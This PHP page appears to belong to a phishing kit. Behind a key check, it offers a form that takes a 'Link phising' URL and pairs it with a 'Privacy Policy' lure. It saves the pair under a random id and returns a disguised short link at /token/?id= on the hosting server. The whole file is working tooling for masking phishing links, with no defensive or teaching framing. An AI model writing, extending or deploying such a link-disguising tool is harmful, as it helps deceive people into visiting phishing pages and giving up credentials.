<?php
include "tools.php";
$Zeins = file_get_contents("../Zeins.txt");
if(empty($_GET['Zeins'])){
redirect('./login.php');
}
if($_GET['Zeins'] == $Zeins){

$Zeins = $_GET['Zeins'];
$id = bin2hex(random_bytes(6));
if($_POST){
	$tampilan = $_POST['tamp'];
	$url = $_POST['url'];
	
	if($tampilan == "Privacy Policy")
	{
	$data = $tampilan."|".$url;
	$dataLink = "dataLink/";
	$bikin = file_put_contents($dataLink.$id.".txt", $data);
	if( $bikin ){
		$website = 'https://'.$_SERVER['SERVER_NAME'].'/token/?id=';
		$short_link = $website.$id;
		$response = $short_link;
		redirect($response);
	}else{
	
	}
}else{
		
		alert('tampilan tidak ada');
		redirect('./createLink.php');
		exit();
		}
	//edirect($response);
}else{
?>
	

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
<title>Short Link</title>
</head>
<style type="text/css" media="all">
body{
    background-image: url(../assets/img/bg.png);
  background-size: cover;
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-position: center;
  width: 100vw;
  height: 100vh;
  overflow: hidden;
}
</style>
<body>

<div class="container mt-5">

<div class="card">
<div class="container mt-5 login">
<form method="POST" action="" autocomplete="off">
<input class="form-control" style="margin-bottom: 5px;" type="text" readonly name="tamp" value="Privacy Policy">
<div class="mb-3 mt-3">
	<input class="form-control" type="url" autofocus name="url" placeholder="Link phising" required="required" />
</div>
<center><button style="margin-top: 5px; margin-bottom: 30px;" type="submit" class="btn btn-danger btn-block btn-large w-100">Create link</button></center>
</form>
</div>

</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
    crossorigin="anonymous"></script>
</body>
</html>
<?php
}
}else{
	header("location: login.php");
	}
?>